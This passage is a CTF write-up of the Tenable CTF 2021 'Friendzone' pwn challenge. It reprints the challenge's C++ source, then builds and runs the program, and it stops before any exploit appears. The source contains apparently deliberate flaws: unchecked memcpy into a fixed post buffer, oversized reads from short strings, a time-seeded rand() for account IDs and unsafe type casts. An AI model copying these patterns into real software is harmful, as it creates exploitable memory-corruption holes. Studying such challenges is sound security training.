---
layout: single
title:  "Tenable CTF 2021 - The Friendzone (250 pt. pwn challenge)"
date:   2021-02-08
excerpt: "The friendzone was the 250 point pwn challenge from Tenable CTF 2021 which involved finding an obscure vulnerability in C++ code. The challenge required the pwner to bypass auhtorization countermeasures to read a VIP's profile. Solving this challenge is proof that buffer overflow vulnerabilities are still applicable in hardened C++ apps and that one does not necessarily need to achieve remote execution to take control over the business logic of an application."
categories:
  - ctf
  - appsec
tags:
  - debugging
  - buffer overflow
  - heap overflow
  - C++ exploitation
  - binary exploitation
  - exploit development
---

## Tenable CTF 2021 - The Friendzone

The friendzone was the 250 point pwn challenge from Tenable CTF 2021 which involved finding an obscure vulnerability in C++ code. The challenge required the pwner to bypass auhtorization countermeasures to read a VIP's profile. Solving this challenge is proof that buffer overflow vulnerabilities are still applicable in hardened C++ apps and that one does not necessarily need to achieve remote execution to take control over the business logic of an application.

If this blog post is too long, you can check out my YouTube video here where I walk through the same content here step-by-step.
Now, let's get to the challenge!

You can also access the source code for this challenge on my [GitHub]()

### Accessing the Source Code

First things first, this challenge provided source code which always makes it easier to find vulnerabilities. Without the source code, some serious fuzzing and reverse-engineering would be necessary to exploit the vulnerability. If you wish to follow along, I have all the source code for this solution up on GitHub.

Now, let's take a look at the source code (feel free to scroll down to the next section, the source code is just here for reference):

#### Friendzone.cpp

```cpp
#include "Console.h"

int main() {
  Console* console = new Console();
  console->Open();
}
```

#### Console.h

```cpp
#pragma once
#include <iostream>
#include <string.h>
#include "Database.h"
#include "AdEnabledAccount.h"
#include <unistd.h>
#include <locale>
#include <set>
#include <iomanip>  
using namespace std;

class COMMANDS {
public:
	static string CREATE_PROFILE;
	static string VIEW_PROFILE;
	static string EDIT_PROFILE;
	static string POST;
	static string LIST_USERS;
};

class Console {
private:
	COMMANDS root_cmds;
	Database* db;
	string cmd;
	Account* LookupProfileId(string profile_id);
	void DisplayRootOptions();
	void HandleRoot();
	void HandleCreate();
	void HandleViewProfile();
	void HandleListUsers();
	void HandleEditProfile();
	void CreateBusinessSetup();
	void ShowAd(string ad_type);
	void CreateUserSetup();
	void HandlePost();
	vector<string> TokenizeCommand();
	void Error(string msg);
public:	
	void Open();
	Console() : db(new Database()) { }
	~Console();
	
};
```

#### Console.cpp

```cpp
#include "Console.h"
#include <algorithm>

string COMMANDS::CREATE_PROFILE = "CREATE_PROFILE";
string COMMANDS::EDIT_PROFILE = "EDIT_PROFILE";
string COMMANDS::VIEW_PROFILE = "VIEW_PROFILE";
string COMMANDS::POST = "POST";
string COMMANDS::LIST_USERS = "LIST_USERS";

bool is_digits(const std::string& str)
{
	return str.find_first_not_of("0123456789") == std::string::npos;
}

void Console::Error(string msg) {
	cout << endl << msg << endl << endl;
	usleep(1000000);
}

// Start new Console
void Console::Open(){
	// Print banner

	cout << " _____     _                _ _____ " << endl;
	cout << "|  ___| __(_) ___ _ __   __| |__  /___  _ __   ___ " << endl;
	cout << "| |_ | '__| |/ _ \\ '_ \\ / _` | / // _ \\| '_ \\ / _ \\"<<endl;
	cout << "|  _|| |  | |  __/ | | | (_| |/ /| (_) | | | |  __/" << endl;
	cout << "|_|  |_|  |_|\\___|_| |_|\\__,_/____\\___/|_| |_|\\___|" << endl;
	cout<<"--------------------------------------------------------------------------------"<<endl;
	cout<<"Welcome to Friendzone Social Media! The leader in most advertisements."<<endl;
	cout<<"--------------------------------------------------------------------------------"<<endl<<endl;
	while(true)
		HandleRoot();
}

// Parse user input into space delimited tokens
vector<string> Console::TokenizeCommand() {
	vector<string> tokens;
	size_t pos = cmd.find(" ");
	size_t last_pos = 0;
	while (pos != std::string::npos) {
		tokens.push_back(cmd.substr(last_pos, pos));
		last_pos = pos + last_pos + 1;
		pos = cmd.substr(last_pos, cmd.length()).find("|");
	}
	tokens.push_back(cmd.substr(last_pos, cmd.length()));
	return tokens;
}

Account* Console::LookupProfileId(string profile_id) {
	Account* act;
	int profile_id_num;
	//ensure only number was passed
	if (!is_digits(profile_id)) {
		Error("Second argument must be a profile ID!");
		return NULL;
	}
	try {
		profile_id_num = stoi(profile_id);
	}
	catch (const std::out_of_range& oor) {
		Error("Invalid! profile_id too big");
		return NULL;
	}
	if (profile_id_num < 100) {
		Error("Profile_ids under 100 are marked as private profiles!");
		return NULL;
	}
	//Lookup account profile and grab its data
	act = db->GetProfileData(profile_id_num);
	if (act == NULL) {
		Error("Profile_id does not exist!");
		return NULL;
	}
	return act;
}

void Console::ShowAd(string ad_type) {
	usleep(1000000);
	cout << "*******************************************************************************************************" << endl << endl;
	cout << "* " << db->GetAdvertisement(ad_type)->GetAdText() << endl << endl;
	cout << "*******************************************************************************************************" << endl << endl << endl << endl;
	usleep(3500000);
}

// Handles view profile command (>VIEW_PROFILE <profile_id>)
void Console::HandleViewProfile() {
	string secondcmd;
	Account* act;

	try {
		secondcmd = TokenizeCommand().at(1); // Get secondary command
	}
	catch (const std::out_of_range& oor) {
		Error("Invalid argument!");
		return;
	}
	act = LookupProfileId(secondcmd);
	if (act == NULL)
		return;

	// Advertisements are accounts but shouldnt be viewable as if they were a user/business
	if (act->GetProfileType() == ProfileType::ADVERTISEMENT) {
		Error("Unable to view account because account is Advertiser - no profile data to see!");
		return;
	}

	// Show advertisement
	cout << "Navigating to " + act->account_name + "... but first an ad!" << endl<<endl;
	ShowAd(((AdEnabledAccount*)act)->ad_type);
	
	//If profile_id was person, load person data
	if (act->GetProfileType() == ProfileType::PERSON) {
		cout << "User Name: " << ((User*)act)->account_name << endl;
		cout << "Gender: " << ((User*)act)->GetGender() << endl;
		cout << "Age: "<< ((User*)act)->GetAge() << endl;
		cout << "Location: "<< ((User*)act)->GetLocation() << endl <<endl;
		cout << "Status:  \"" << ((User*)act)->status <<"\""<< endl;
		cout << "_______________________________________________________________________________" << endl << endl;
		cout << "Latest Comment: \"" << string(((User*)act)->last_post) << "\"" << endl << endl;
		cout << "_______________________________________________________________________________" << endl << endl<<endl<<endl;
	}
	//If profile_id was business, load business data
	else if (act->GetProfileType() == ProfileType::BUSINESS) {
		cout << "Business Name: " << ((Business*)act)->account_name << endl;
		cout << "Address: " << ((Business*)act)->GetAddress() << endl;
		cout << "Status: \"" << ((Business*)act)->GetStatus() << "\""<< endl;
		cout << "_______________________________________________________________________________" << endl << endl;
		cout << "Latest Comment: \"" << string(((Business*)act)->last_post) << "\""<<endl << endl;
		cout << "_______________________________________________________________________________" << endl << endl << endl << endl;
	}
}

// Handles "EDIT_PROFILE" cmd
void Console::HandleEditProfile() {
	Account* act;
	string change_option, change_data, secondcmd;
	bool valid_response_flag = false;
	try {
		secondcmd = TokenizeCommand().at(1); // Get secondary command
	}
	catch (const std::out_of_range& oor) {
		Error("Invalid argument!");
		return;
	}
	act = LookupProfileId(secondcmd);
	if (act == NULL)
		return;
	if (act->GetProfileType() == ProfileType::ADVERTISEMENT) {
		do {
			cout << "What new ad type should this be?" << endl << endl << "ad_type>";
			getline(cin, change_option);
			if (change_option.length() < 50) {
				if (((Advertisement*)act)->ChangeAdType(change_option)) {
					valid_response_flag = true;
				}
				else {
					Error("Invalid! Ad_type does not exist");
				}
					
			}
		} while (!valid_response_flag);
	}
	else {
		do {
			cout << "What would you like to change for " + act->account_name + "?" << endl << endl;
			cout << "*User Name" << endl;
			cout << "*Status" << endl<<endl<<"cmd>";
			getline(cin, change_option);
			if (change_option.length() < 50) {
				if (change_option == "User Name") {
					cout << "What new user name would you like?" << endl << endl << "user name>";
					getline(cin, change_data);
					if (change_data.length() < 50) {
						((AdEnabledAccount*)act)->account_name = change_data;
						valid_response_flag = true;
					}
					else {
						Error("Invalid! User name too long");
					}
				}
				else if (change_option == "Status") {
					cout << "Enter a new status" << endl << endl << "status>";
					getline(cin, change_data);
					if (change_data.length() < 200) {
						((AdEnabledAccount*)act)->status = change_data;
						valid_response_flag = true;
					}
					else {
						Error("Invalid! Status too long");
					}
				}
				else {
					Error("Invalid! No such option");
				}
			}
			else {
				Error("Invalid! Option too long");
			}
		} while (!valid_response_flag);
	}
}

// Handles "CREATE_PROFILE business" cmd
void Console::CreateBusinessSetup() {
	string business_name, city, state, street_number, street_name, ad_type;
	set<string> available_ad_types;
	Business* b;
	bool valid_response_flag = false;

	// Read business name
	do
	{
		cout<<"Business Name>";
		getline(cin, business_name);
		if(business_name.length() > 30)
			cout<<"Please enter business name less than 30 characters"<<endl;
	} while (business_name.length() > 30);

	cout << endl << "*********Welcome " + business_name + "! Let's get your address**********" << endl<<endl;
	// Read business street
	do{
		cout<<"Enter your business street number>";
		getline(cin, street_number);
		if (is_digits(street_number)) {
			valid_response_flag = true;
		}
		else {
			Error("Invalid! This must be a number");
		}
	} while (!valid_response_flag);
	valid_response_flag = false;

	//Read business street name
	do {
		cout << "Enter your business street name>";
		getline(cin, street_name);
		if (street_name.length() < 20) {
			valid_response_flag = true;
		}
		else {
			Error("Invalid! Street name too long");
		}
	} while (!valid_response_flag);
	valid_response_flag = false;

	//Read business city name
	do {
		cout << "Enter your business city>";
		getline(cin, city);
		if (city.length() < 20) {
			valid_response_flag = true;
		}
		else {
			Error("Invalid! City name too long");
		}
	} while (!valid_response_flag);

	valid_response_flag = false;

	//Read business state name
	do {
		cout << "Enter your business state>";
		getline(cin, state);
		if (state.length() < 20) {
			valid_response_flag = true;
		}
		else {
			Error("Invalid! State name too long");
		}
	} while (!valid_response_flag);
	valid_response_flag = false;
	cout << "And finally, what kind of ads would you like to be shown to visitors that visit your profile?" << endl << endl;

	// print available ad_types
	available_ad_types = db->GetAdTypes();
	for (set<string>::iterator it = available_ad_types.begin(); it != available_ad_types.end(); ++it)
		cout << *it << endl;
	//Read ad_types
	do {
		// read ad_type
		cout << endl << "Enter an ad_type>";
		getline(cin, ad_type);
		if (ad_type.length() < 50) {
			if (available_ad_types.find(ad_type) != available_ad_types.end()) {
				try {
					b = new Business(business_name, street_number + " " + street_name + "\n" + city + ", " + state, string(""), ad_type);
					valid_response_flag = true;
				}
				catch (const std::invalid_argument& e) {
					Error("Invalid AdType!");
				}
			}
			else {
				Error("Invalid! No such Adtype");
			}
		}
		else {
			Error("Invalid! Too long Adtype.");
		}
	} while (!valid_response_flag);

	// Store new user profile to database
	db->AddAccount(b);
	cout << "Welcome to FriendZone " + business_name + "! (profile_id:" + to_string(b->GetProfileId())  +")"<<endl;

} 

// Handles CREATE_PROFILE cmd
void Console::HandleCreate() {
	string secondcmd;
	try{
		secondcmd = TokenizeCommand().at(1); // Get secondary command
	}	
	catch(const std::out_of_range& oor) {
		Error("Invalid command!");
		return;
	}
	
	if (secondcmd == "business")
		CreateBusinessSetup();
	else if (secondcmd == "personal")
		CreateUserSetup();
	else
		Error("Invalid! No such second argument");
}

// Handles "CREATE_PROFILE personal" cmd
void Console::CreateUserSetup() {
	User* u;
	set<string> available_ad_types;
	string user_name, location, age, gender, ad_type;
	bool valid_response_flag = false;
	unsigned int age_num;

	// Read user name
	do
	{
		cout << "User Name>";
		getline(cin, user_name);
		if (user_name.length() > 30)
			Error("Please enter user name less than 30 characters");
	} while (user_name.length() > 30);
	cout << endl << "*********Welcome " + user_name + "! Let's get your general location**********" << endl << endl;

	//Read user city name
	do {
		cout << "Enter your city, state>";
		getline(cin, location);
		if (location.length() < 20) {
			valid_response_flag = true;
		}
		else {
			cout << "Invalid! city, state input too long" << endl;
		}
	} while (!valid_response_flag);

	valid_response_flag = false;
	//Read Gender
	do {
		cout << "Enter your Gender>";
		getline(cin, gender);
		if (gender.length() < 20) {
			valid_response_flag = true;
		}
		else {
			Error("Invalid! gender input too long.");
		}
	} while (!valid_response_flag);
	valid_response_flag = false;
	//Read Age
	do {
		cout << "Enter your Age>";
		getline(cin, age);
		if (is_digits(age)) {
			try {
				age_num = stoi(age);
				valid_response_flag = true;
			}
			catch (const std::out_of_range& oor) {
				Error("Invalid! Age too big");
			}
			
		}
		else {
			Error("Invalid! age must be number.");
		}
	} while (!valid_response_flag);
	valid_response_flag = false;
	cout << "And finally, what kind of ads would you like to be shown to visitors that visit your profile?" << endl << endl;

	// print available ad_types
	available_ad_types = db->GetAdTypes();
	for (set<string>::iterator it = available_ad_types.begin(); it != available_ad_types.end(); ++it)
		cout << *it << endl;
	
	// read ad_type
	do {
		cout << endl << "Enter an AdType>";
		getline(cin, ad_type);
		if (ad_type.length() < 50) {
			if (available_ad_types.find(ad_type) != available_ad_types.end()) {
				try {
					u = new User(user_name, location, age_num, gender, string(""), ad_type);
					valid_response_flag = true;
				}
				catch (const std::invalid_argument& e) {
					Error("Invalid AdType!");
				}
			}
			else {
				Error("Invalid! No such Adtype");
			}
		}
		else {
			Error("Invalid! Too long Adtype.");
		}
	} while (!valid_response_flag);
	db->AddAccount(u);
	cout << "Welcome to FriendZone " + user_name + "! (profile_id:" + to_string(u->GetProfileId()) + ")" << endl;
}

void Console::HandleListUsers() {
	cout <<endl<< "Profile Ids" << endl << "-------------" << endl << endl;
	vector<unsigned int> profile_ids = db->GetProfileIds();
	for (vector<unsigned int>::iterator it = profile_ids.begin(); it != profile_ids.end(); ++it)
		cout << *it << endl;
	cout <<endl<< endl;
}

// Load root menu
void Console::DisplayRootOptions() {
	cout << "---------------------------------------------------------" << endl;
	cout << "Portal Options" << endl << endl;
	cout << "-" + root_cmds.CREATE_PROFILE + " <personal|business>" << endl;
	cout << "-" + root_cmds.LIST_USERS << endl;
	cout << "-" + root_cmds.VIEW_PROFILE + " <profile_id>" << endl;
	cout << "-" + root_cmds.POST + " <profile_id>>" << endl;
	cout << "-" + root_cmds.EDIT_PROFILE + " <profile_id>" << endl << endl;
	cout << "---------------------------------------------------------" << endl << endl << endl << "cmd>";
}

// Handle POST <profile_id> cmd
void Console::HandlePost() {
	string secondcmd, post_msg;
	Account* act;
	int profile_id;
	bool valid_response_flag = false;
	try {
		secondcmd = TokenizeCommand().at(1); // Get secondary command
	}
	catch (const std::out_of_range& oor) {
		Error("Invalid profile_id!");
		return;
	}
	act = LookupProfileId(secondcmd);
	if (act == NULL)
		return;
	try {
		profile_id = stoi(secondcmd);
	}
	catch (const std::out_of_range& oor) {
		Error("Invalid! profile_id too big");
		return;
	}

	// Read user post message
	do {
		cout << "What would you like to post to " + db->GetProfileData(profile_id)->account_name + " wall?" << endl << endl<<"post>";
		getline(cin, post_msg);
		if (post_msg.length() < 0x1000) {
			valid_response_flag = true;
			memset(((AdEnabledAccount*)db->GetProfileData(profile_id))->last_post, 0, 0x1000);
			memcpy(((AdEnabledAccount*)db->GetProfileData(profile_id))->last_post, post_msg.c_str(), post_msg.length());
		}
		else {
			Error("Invalid! too long post.");
		}
	} while (!valid_response_flag);

}

// Default menu
void Console::HandleRoot(){
	string rootcmd;
   
	DisplayRootOptions();
	// Read cmd
	getline(cin, cmd);
	try{
		rootcmd = TokenizeCommand().at(0); // Get root command
	}	
	catch(const std::out_of_range& oor) {
		Error("Invalid root command!");
		return;
	}
	// Execute Cmd
	if (rootcmd == root_cmds.CREATE_PROFILE)
		HandleCreate();
	else if (rootcmd == root_cmds.VIEW_PROFILE)
		HandleViewProfile();
	else if (rootcmd == root_cmds.LIST_USERS)
		HandleListUsers();
	else if (rootcmd == root_cmds.POST)
		HandlePost();
	else if (rootcmd == root_cmds.EDIT_PROFILE)
		HandleEditProfile();
}
```

#### Database.h

```cpp
#pragma once
#include "User.h"
#include "Business.h"
#include "Advertisement.h"
#include <vector>
#include <stdexcept>
#include <time.h>
#include <unistd.h>
#include <iostream>
#include <map>
#include <set>
#include <algorithm>

using namespace std;

class Database {
private:
	const string profile_directory;
    // Map profile_id to account
	map<unsigned int, Account*> accounts;
	void LoadAccounts();
	void LoadProfile(string profiledata);
	vector<string> ParseProfile(string profiledata);
public:
	Database();
	void AddAccount(Account* user);
	Account* GetProfileData(unsigned int profile_id);
	Advertisement* GetAdvertisement(string ad_type);
	set<string> GetAdTypes();
	vector<unsigned int> GetProfileIds();
};
```

#### Database.cpp

```cpp
#include "Database.h"
#include <sys/stat.h>
#include <stdio.h>
#include <dirent.h>
#include <cstring>


Database::Database() : profile_directory("profiles/") {
	LoadAccounts();
}

void Database::LoadAccounts() {
	char buffer[0x1000] = { 0 };
	struct dirent* pDirent;
	
	DIR* epdf = opendir(profile_directory.c_str());
	if (epdf != NULL) {
		while (pDirent = readdir(epdf)) {
			if (pDirent->d_type != DT_DIR) {
				FILE* fp = fopen(string(profile_directory + string(pDirent->d_name)).c_str(), "r");
				cout << "Loading " + string(profile_directory + string(pDirent->d_name)) + " profile data..." << endl;
				
				fread(buffer, 0x1000, 1, fp);
				LoadProfile(string(buffer));
				memset(buffer, 0, 0x1000);
				usleep(500000);
			}
		}
	}
}

vector<string> Database::ParseProfile(string profiledata) {
	vector<string> tokens;
	size_t pos = profiledata.find("|");
	size_t last_pos = 0;
	while (pos != std::string::npos) {
		tokens.push_back(profiledata.substr(last_pos, pos));
		last_pos = pos+last_pos+1;
		pos = profiledata.substr(last_pos, profiledata.length()).find("|");
	}
	tokens.push_back(profiledata.substr(last_pos, profiledata.length() - last_pos));

	return tokens;
}
void Database::LoadProfile(string profiledata) {
	vector<string> profile_items = ParseProfile(profiledata);
	string ad_type, name, address, status, gender;
	char last_post[0x1000];
	Business* bs;
	User* u;
	Advertisement* ad;
	unsigned int profile_type, profile_id, age;
	try {
		profile_type = stoi(profile_items.at(0));
		name = profile_items.at(1);
		profile_id = stoi(profile_items.at(2));
	}
	catch (const std::out_of_range& oor) {
		cout << "Error parsing profile data" << endl;
		return;
	}

	switch (profile_type) {
	case ProfileType::PERSON:
		try {
			address = profile_items.at(3);
			age = stoi(profile_items.at(4));
			gender = profile_items.at(5);
			status = profile_items.at(6);
			memcpy(last_post, profile_items.at(7).c_str(), 0x1000);
			ad_type = profile_items.at(8);
		}
		catch (const std::out_of_range& oor) {
			cout << "Error parsing profile data" << endl;
			return;
		}
		u = new User(name, address, age, gender, status, ad_type);
		u->profile_id = profile_id;
		memcpy(u->last_post, last_post, 0x1000);
		AddAccount(u);
		break;
	case ProfileType::BUSINESS:
		try {
			address = profile_items.at(3);
			status = profile_items.at(4);
			memcpy(last_post, profile_items.at(5).c_str(), 0x1000);
			ad_type = profile_items.at(6);
		}
		catch (const std::out_of_range& oor) {
			cout << "Error parsing profile data" << endl;
			return;
		}
		
		bs = new Business(name, address, status, ad_type);
		bs->profile_id = profile_id;
		memcpy(bs->last_post, last_post, 0x1000);
		AddAccount(bs);
		break;
	case ProfileType::ADVERTISEMENT:
		ad = new Advertisement(name);
		ad->profile_id = profile_id;
		AddAccount(ad);
		break;
	}

}

void Database::AddAccount(Account* act) {
	this->accounts[act->profile_id] = act;
}

vector<unsigned int>  Database::GetProfileIds() {
	vector<unsigned int> profile_ids;
	for (map<unsigned int, Account*>::iterator it = this->accounts.begin(); it != this->accounts.end(); ++it)
		profile_ids.push_back(it->first);
	return profile_ids;
}

Advertisement* Database::GetAdvertisement(string ad_type) {

	for (map<unsigned int, Account*>::iterator it = this->accounts.begin(); it != this->accounts.end(); ++it) {
		if (it->second->GetProfileType() == ProfileType::ADVERTISEMENT) {
			if (((Advertisement*)it->second)->GetAdType() == ad_type)
				return (Advertisement*)it->second;
		}
	}
	return NULL;
}

set<string> Database::GetAdTypes() {
	set<string> ad_types;
	for (map<unsigned int, Account*>::iterator it = this->accounts.begin(); it != this->accounts.end(); ++it) {
		if (it->second->GetProfileType() == ProfileType::ADVERTISEMENT) {
			ad_types.insert(((Advertisement*)it->second)->GetAdType());
		}
	}
	return ad_types;
}

Account* Database::GetProfileData(unsigned int profile_id) {
	if(this->accounts.find(profile_id) != this->accounts.end())
		return this->accounts[profile_id];
	return NULL;
}
```

#### Account.cpp

```cpp
#include "Account.h"

Account::Account(ProfileType pt) {
	srand(time(NULL)); 
	time(&account_creation_date); 
	this->profile_id = rand();
	this->profile_type = pt;
}

unsigned int Account::GetProfileId() {
	return this->profile_id;
}

ProfileType Account::GetProfileType() {
	return profile_type;
}
```

#### Account.h

```cpp
#pragma once
#include <string>
#include <time.h> 
#include <vector>
using namespace std;

// Used to identify object types.
enum ProfileType {
	PERSON,
	BUSINESS,
	ADVERTISEMENT
};

class Account {
protected:
	vector<string> posts;
	time_t account_creation_date;
	string profile_pic;
	ProfileType profile_type;
	const string users_directory;
public:
	unsigned int profile_id;
	string account_name;
	Account(ProfileType pt);
	ProfileType GetProfileType();
	unsigned int GetProfileId();
	

};
```

#### User.h

```cpp
#pragma once
#include "AdEnabledAccount.h"
#include "Account.h"

class User : public AdEnabledAccount {
private:
	unsigned int age;
	string gender;
	string location;

public:
	User(string name, string location, unsigned int age, string gender, string status, string ad_type);
	string GetGender();
	string GetLocation();
	unsigned int GetAge();
};
```

#### User.cpp

```cpp
#include "User.h"

User::User(string name, string location, unsigned int age, string gender, string status, string ad_type) : AdEnabledAccount(ProfileType::PERSON, ad_type) {
	this->account_name = name;
	this->age = age;
	this->gender = gender;
	this->location = location;
	this->status = status;
}

string User::GetLocation() {
	return location;
}

string User::GetGender() {
	return gender;
}

unsigned int User::GetAge() {
	return age;
}
```

#### Business.h

```cpp
#pragma once
#include "Account.h"
#include "AdEnabledAccount.h"

#include <string>
using namespace std;

class Business : public AdEnabledAccount {
private:
	string address;
public:
	Business(string name, string address, string status, string ad_type);
	string GetStatus();
	string GetAddress();
};
```

#### Business.cpp

```cpp
#include "Business.h"

Business::Business(string name, string address, string status, string ad_type) : AdEnabledAccount(ProfileType::BUSINESS, ad_type) {
	this->account_name = name;
	this->address = address;
	this->status = status;
}

string Business::GetAddress() {
	return this->address;
}

string Business::GetStatus() {
	return this->status;
}
```

#### AdEnabledAccount.h

```cpp
#pragma once
#include <string>
#include <vector>
#include "Advertisement.h"
using namespace std;

class AdEnabledAccount : public Account {
public:
	char last_post[0x1000];
	string status;
	string ad_type;
	vector<string> posts;
	AdEnabledAccount(ProfileType profile_type, string ad_type);
	void AddPost(string post);
};
```

#### AdEnabledAccount.cpp

```cpp
#include "AdEnabledAccount.h"
#include <iostream>
#include <cstring>
#include <algorithm>

AdEnabledAccount::AdEnabledAccount(ProfileType profile_type, string ad_type) : Account(profile_type) {
	ad_type.erase(std::remove(ad_type.begin(), ad_type.end(), '\n'), ad_type.end());
	this->ad_type = ad_type;
}

void AdEnabledAccount::AddPost(string post) {
	posts.push_back(post);
	// ensure posts list is below 50 posts (FILO)
	if (post.length() >= 50) {
		post.erase(post.begin());
	}
}
```

#### Advertisement.h

```cpp
#pragma once
#include "Account.h"
#include <stdexcept>
#include <cstring>
using namespace std;

class Advertisement : public Account {
	
public:
	char ad_text[0xf00];
    char advertisers_directory[0x100] = "advertisements/";
	string ad_type;
	Advertisement(string ad_type);
	bool ChangeAdType(string ad_type);
	bool IsAdTypeValid(string ad_type);
	string GetAdType();
	string GetAdText();
};
```

#### Advertisement.cpp

```cpp
#include "Advertisement.h"
#include <algorithm>
#include <iostream>

Advertisement::Advertisement(string ad_type) : Account(ProfileType::ADVERTISEMENT) {
	ad_type.erase(std::remove(ad_type.begin(), ad_type.end(), '\n'), ad_type.end());
	if (!IsAdTypeValid(ad_type))
		throw std::invalid_argument("Invalid Ad_type");
	this->ad_type = ad_type;
}

string Advertisement::GetAdType() {
	return ad_type;
}

bool Advertisement::ChangeAdType(string ad_type) {
	if (!IsAdTypeValid(ad_type))
		return false;
	this->ad_type = ad_type;
	return true;
}

bool Advertisement::IsAdTypeValid(string ad_type) {
	// prevent directory traversal
	if (ad_type.find(".") != std::string::npos || ad_type.find("\\") != std::string::npos || ad_type.find("/") != std::string::npos)
		return false;
	
	//check ad_type file exists in advertisers_directory
	FILE* fp = fopen(string(advertisers_directory + ad_type).c_str(), "r");

	if (fp != NULL)
		return true;
	return false;
}

string Advertisement::GetAdText() {
	//Read advertisement from file
	memset(this->ad_text, 0, 0xf00);
	
	FILE* fp = fopen(string(advertisers_directory + this->ad_type).c_str(), "r");
	if (fp == NULL) {
		return "404 - NO_AD_FOUND! This is a bug, please report to FriendZone support.";
	}
	fread(ad_text, 0xf00, 1, fp);
	return string(ad_text);
}
```

### Understanding the Objective

Whenever you are subject to any sort of infosec-related endeavor, you always need an objective. 
In this case, the objective was to read a VIP user's profile through some "obscure" vulnerability.

In C/C++ apps, these are the following categories of vulnerabilities I typically to look for:

* Dangerous calls to the `system()` and `exec` family calls
* String format vulnerabilities
* Buffer overflows
* Business logic errors on security controls
* Directory traversal with read/write
* Broken cryptography
* Insecurely seeded pseudo-random number generators

Now that we are aware of some of the most common critical security vulnerabilities in C/C++ applications, we need to analyze the target.

### Analyzing the Target

Before getting too caught up in reviewing the code above, I like to understand what the application subject to testing does to understand its purpose.
After playing around with the application and figuring out its purpose, I will focus more on security features. Some obvious questions come to mind:

* Does the application require authentication?
* Which features are protected by access controls (authorization)?
* Does the application have good input validation?
* How does the application receive untrusted input?

Moving forward, we need a runtime environment. Currently, we have the source code, but no executable! How will we be able to debug the binary?

### Building the Executable

So far, we need an executable to run. However, we need to build one first!
My favorite C++ build tool is [CMake](https://cmake.org/), a C/C++ build tool that allows C/C++ code to be built on multiple operating systems! I also find it much easier to work with than raw Makefiles.

CMake searches for a `CMakeLists.txt` in most directories that have source code, so we will need to write one. I wrote the following `CMakeLists.txt` file and placed it in the same directory as the rest of the source code.

#### CMakeLists.txt

```cmake
project(friendzone)
set(CMAKE_BUILD_TYPE Debug)
file(GLOB hax_SRC "*.h" "*.cpp")
add_executable(friendzone ${hax_SRC})
```

The code above specifies the name of the project, compiling a debug build of the executable from all the C++ source and header files in the same directory as the `CMakeLists.txt` file. The final executable will be named `friendzone`.

Next, create a `build` directory in the same directory as the rest of the source code and we will build the executable with debug symbols!

```
┌──(kali㉿kali)-[~/…/tenable-2021/writeups/friendzone/source]
└─$ ls
Account.cpp  AdEnabledAccount.cpp  Advertisement.cpp  Business.cpp  CMakeLists.txt  Console.h     Database.h      notes.txt  User.h
Account.h    AdEnabledAccount.h    Advertisement.h    Business.h    Console.cpp     Database.cpp  Friendzone.cpp  User.cpp

┌──(kali㉿kali)-[~/…/tenable-2021/writeups/friendzone/source]
└─$ mkdir build

┌──(kali㉿kali)-[~/…/tenable-2021/writeups/friendzone/source]
└─$ cd build

┌──(kali㉿kali)-[~/…/writeups/friendzone/source/build]
└─$ cmake ..
-- The C compiler identification is GNU 10.2.1
-- The CXX compiler identification is GNU 10.2.1
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Check for working C compiler: /usr/bin/cc - skipped
-- Detecting C compile features
-- Detecting C compile features - done
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Check for working CXX compiler: /usr/bin/c++ - skipped
-- Detecting CXX compile features
-- Detecting CXX compile features - done
CMake Warning (dev) in CMakeLists.txt:
  No cmake_minimum_required command is present.  A line of code such as

    cmake_minimum_required(VERSION 3.18)

  should be added at the top of the file.  The version specified may be lower
  if you wish to support older CMake versions for this project.  For more
  information run "cmake --help-policy CMP0000".
This warning is for project developers.  Use -Wno-dev to suppress it.

-- Configuring done
-- Generating done
-- Build files have been written to: /home/kali/ctf/tenable-2021/writeups/friendzone/source/build

┌──(kali㉿kali)-[~/…/writeups/friendzone/source/build]
└─$ make -j4
Scanning dependencies of target friendzone
[ 33%] Building CXX object CMakeFiles/friendzone.dir/AdEnabledAccount.o
[ 33%] Building CXX object CMakeFiles/friendzone.dir/Advertisement.o
[ 33%] Building CXX object CMakeFiles/friendzone.dir/Account.o
[ 44%] Building CXX object CMakeFiles/friendzone.dir/Business.o
[ 55%] Building CXX object CMakeFiles/friendzone.dir/Console.o
[ 66%] Building CXX object CMakeFiles/friendzone.dir/Database.o
[ 77%] Building CXX object CMakeFiles/friendzone.dir/Friendzone.o
[ 88%] Building CXX object CMakeFiles/friendzone.dir/User.o
[100%] Linking CXX executable friendzone
[100%] Built target friendzone
```

You should now have the `friendzone` executable in your current working directory.

### Running the Executable

Now, let's run the executable and try to find that "forbidden" profile we want to read.

```
┌──(kali㉿kali)-[~/…/writeups/friendzone/source/build]
└─$ ./friendzone
 _____     _                _ _____
|  ___| __(_) ___ _ __   __| |__  /___  _ __   ___
| |_ | '__| |/ _ \ '_ \ / _` | / // _ \| '_ \ / _ \
|  _|| |  | |  __/ | | | (_| |/ /| (_) | | | |  __/
|_|  |_|  |_|\___|_| |_|\__,_/____\___/|_| |_|\___|
--------------------------------------------------------------------------------
Welcome to Friendzone Social Media! The leader in most advertisements.
--------------------------------------------------------------------------------

---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>LIST_USERS

Profile Ids
-------------



---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>
```

### Replicating the Remote Environment

Hmmm....Looks like there are no profiles to read from!
In the CTF, there was a profile with ID 6 that we needed to read from as well as a few others.
Since I don't have the data associated with the other profiles, I will break it down here (if you were doing the CTF, you would have to analyze the differences in the profiles available):

* Profile ID 6 was the VIP profile that we want to read.
* Profile IDs with very high ID numbers representing users, advertisements, and businesses.

Since we don't have any data, and the CTF server did not have importing/exporting features, we need to figure out how the application loads these profiles.
Fortunately, I still had the names of the remote profiles from the CTF, so we will use similar ones in our local debugging environment.

```
    Loading profiles/friendzone_ceo profile data...
    Loading profiles/car_ads profile data...
    Loading profiles/katie_humphries profile data...
    Loading profiles/tech_ads profile data...
    Loading profiles/BiscuitsCoffee profile data...
    Loading profiles/waygu_store profile data...
    Loading profiles/douglas_schmelkov profile data...
    Loading profiles/food_ads profile data...

    |  ___| __(_) ___ _ __   __| |__  /___  _ __   ___ 
